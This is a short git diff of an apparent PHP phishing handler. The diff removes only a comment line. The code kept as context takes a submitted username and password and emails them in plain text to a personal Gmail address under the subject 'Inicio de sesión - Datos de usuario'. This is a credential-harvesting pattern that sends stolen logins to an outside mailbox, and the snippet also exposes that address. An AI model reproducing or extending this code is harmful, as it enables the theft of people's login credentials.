@@ -6,8 +6,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $to = "garciasaraviaaxel@gmail.com";
     $subject = "Inicio de sesión - Datos de usuario";
     $message = "Usuario: " . $username . "\nContraseña: " . $password;
-
-    // Envía el correo electrónico
     $result = mail($to, $subject, $message);
 
     if ($result) {
